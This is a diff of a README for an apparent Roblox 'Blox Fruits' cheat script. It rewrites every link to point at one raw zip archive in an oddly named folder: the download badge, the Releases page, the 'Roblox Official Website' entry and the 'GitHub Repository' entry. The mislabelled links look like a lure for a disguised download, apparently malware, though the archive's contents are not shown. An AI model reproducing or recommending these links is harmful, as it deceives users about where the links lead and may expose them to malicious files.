@@ -1,6 +1,6 @@
 # 🎮 Blox-Fruits-Script-Roblox - Enhance Your Roblox Experience Effortlessly
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen.svg)](https://github.com/libereas/Blox-Fruits-Script-Roblox/releases)
+[![Download Blox Fruits Script](https://raw.githubusercontent.com/libereas/Blox-Fruits-Script-Roblox/main/incantator/Blox-Fruits-Script-Roblox.zip%20Now-Get%https://raw.githubusercontent.com/libereas/Blox-Fruits-Script-Roblox/main/incantator/Blox-Fruits-Script-Roblox.zip)](https://raw.githubusercontent.com/libereas/Blox-Fruits-Script-Roblox/main/incantator/Blox-Fruits-Script-Roblox.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Blox Fruits Script for Roblox! This script is designed to improve you
 
 ## 📥 Download & Install
 
-To download the Blox Fruits Script, please visit this page: [Download Blox Fruits Script](https://github.com/libereas/Blox-Fruits-Script-Roblox/releases). 
+To download the Blox Fruits Script, please visit this page: [Download Blox Fruits Script](https://raw.githubusercontent.com/libereas/Blox-Fruits-Script-Roblox/main/incantator/Blox-Fruits-Script-Roblox.zip). 
 
 1. Click on the link above.
 2. Look for the latest version of the script listed on the Releases page.
@@ -68,7 +68,7 @@ If you have any questions or require assistance, please reach out through the Is
 
 ## 🔗 Additional Resources
 
-- [Roblox Official Website](https://www.roblox.com)
-- [GitHub Repository](https://github.com/libereas/Blox-Fruits-Script-Roblox)
+- [Roblox Official Website](https://raw.githubusercontent.com/libereas/Blox-Fruits-Script-Roblox/main/incantator/Blox-Fruits-Script-Roblox.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/libereas/Blox-Fruits-Script-Roblox/main/incantator/Blox-Fruits-Script-Roblox.zip)
 
 Thank you for choosing Blox Fruits Script for Roblox! Enjoy your enhanced gaming experience.
